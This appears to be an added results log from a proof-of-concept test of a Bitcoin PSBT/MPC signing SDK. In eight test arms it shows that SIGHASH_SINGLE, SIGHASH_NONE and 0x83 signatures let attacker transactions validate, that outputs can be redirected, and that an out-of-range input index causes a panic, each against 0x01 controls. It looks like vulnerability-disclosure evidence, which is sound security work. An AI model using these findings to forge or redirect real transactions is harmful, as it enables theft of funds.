@@ -1,0 +1,44 @@
+-- binary hashes (deterministic: -buildvcs=false)
+SHA256 bin-singlebug = c9d3f3dfa07a2aa28ff309dc4556f264e536f09cd271be5372e654d0639232b1
+SHA256 bin-declare = 4f542ca4b9355550ec6fd1a9e3fd2490f2f0e21ac7f40bbe8270cf19ff733d39
+SHA256 bin-segwit = c6409cfd536d92a8c0a787163bfc58d067772978dde21fb263463488e325fba2
+SHA256 bin-redirect = ae70d8bd1af02aea2144c7fb3fbdae299c9640c2727777f874b7e95c7d84bfd2
+SHA256 bin-acp = 4db4886a579a900c862ff8e4cd74dd30350bd0c4eb2d821c2610ef7449576221
+SHA256 bin-panic = d6c1e134dec3ac722c07f6169c130ca5c5243a0d41e07b332a7e9865ab13c8a7
+SHA256 bin-mpc = 5c588eb36cd7513bc1b2eb110a0e2472c732d4cc75ad26a36343c168943e3fef
+SHA256 bin-accept = 958727c8c61e3c6134b8af0c6561b996f21a926246f4d3527217594056d90059
+== arm 1: legacy SINGLE (0x03) and allowlisted 0x83 vs control 0x01 ==
+CELL S-0x03 signer_digest=0100000000000000000000000000000000000000000000000000000000000000 (single-bug constant=true) attacker_tx_sig_valid=true err=<nil>
+CELL S-0x83 signer_digest=0100000000000000000000000000000000000000000000000000000000000000 (single-bug constant=true) attacker_tx_sig_valid=true err=<nil>
+CELL S-0x01 signer_digest=f6da778b2a846438df6f49a1b53de0fa3d89f8dda642813a52148763923942be (single-bug constant=false) attacker_tx_sig_valid=false err=<nil>
+== arm 2: no-override reach (PSBT declares allowlisted 0x83; caller passes nothing) ==
+CELL A-returned_err_nil=true
+CELL A-declared-empty-options declared_psbt_sighash=0x83 digest_is_constant_01=true attacker_tx_script_0x33_sig_valid=true
+CELL B-returned_err_nil=true
+CELL B-declared-nil-option declared_psbt_sighash=0x83 digest_is_constant_01=true attacker_tx_script_0x33_sig_valid=true
+CELL C-returned_err_nil=true
+CELL C-raw-psbt-entry declared_psbt_sighash=0x83 digest_is_constant_01=true attacker_tx_script_0x33_sig_valid=true
+== arm 3: P2WPKH SINGLE (0x03) vs control 0x01 ==
+CELL W0-shape inputs=2 outputs=1 victim_index=1 (single-bug needs idx>=outputs)
+CELL W1-sign-0x03 err=nil hash_byte=0x03 idx=1 n_out=1
+CELL W2-p2wpkh-single original_valid=true redirected_output_to_0x22_script_still_valid=true
+CELL W3-control-0x01 redirected_still_valid=false (expect false)
+== arm 4: SIGHASH_NONE (0x02) output redirection vs control 0x01 ==
+CELL H1R-0x02 original_valid=true redirected_output(999 to 0x11..)_still_valid=true
+CELL H1R-0x01 original_valid=true redirected_output(999 to 0x11..)_still_valid=false
+== arm 5: 0x83 prepared-signature append-input survival vs control 0x01 ==
+CELL H1-0x83 control_original_valid=true (hash_byte=0x83)
+CELL H1-acp-0x83 sig_survives_appended_input=true
+CELL H1-0x01 control_original_valid=true (hash_byte=0x01)
+CELL H1-acp-0x01 sig_survives_appended_input=false
+== arm 6: unguarded NonWitnessUtxo index (PSBT says index 99, funding tx has one output) ==
+CELL P-raw panic=runtime error: index out of range [99] with length 1
+CELL P-keypath panic=runtime error: index out of range [99] with length 1
+== arm 7: SDK MPC flow (GenerateMPCUnsignedPSBT -> sign -> GenerateMPCSignedPSBT) ==
+CELL M-direct-0x83 declared=0x83 signer_digest=0100000000000000000000000000000000000000000000000000000000000000 digest_is_constant_01=true
+CELL M-direct-0x83 mpc_signed_attacker_tx_sig_valid=true
+CELL M-control-0x01 declared=0x01 signer_digest=bfb50792126e6774e06e97706ecd5a9f349f34449ea3b87838c7cde281ac5dff digest_is_constant_01=false
+CELL M-control-0x01 mpc_signed_attacker_tx_sig_valid=false
+== arm 8: does the attacker transaction pass the script engine? ==
+CELL A1-single-0x83 declared=0x83 script_engine_accepts_attacker_tx=true err=<nil>
+CELL A2-control-0x01 declared=0x01 script_engine_accepts_attacker_tx=false err=signature not empty on failed checksig
